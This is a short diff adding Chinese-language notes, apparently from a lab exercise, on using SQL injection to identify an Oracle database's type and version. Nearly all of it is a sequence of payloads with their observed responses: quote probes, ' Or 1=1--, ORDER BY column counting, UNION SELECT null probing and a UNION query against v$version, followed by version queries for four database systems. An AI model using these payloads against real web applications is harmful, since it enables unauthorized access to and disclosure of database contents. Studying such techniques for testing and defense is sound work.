@@ -1,0 +1,19 @@
+SQL 注入攻击，查询 Oracle 数据库类型和版本:
+
+'
+'--
+' Or 1=1--
+' Order by 3--    
+>> inter server error -> 字段为2
+' Union select null, null--		
+>> inter server error -> 不是微软和mysql数据库
+根据提示：
+oracle数据库 dual表
+' Union select banner, null from v$version--
+
+>> 成功爆出数据库类型和版本
+
+Oracle: select banner from v$version
+Microsoft: select @@version
+PostgreSQL: select version()
+Mysql: select @@version
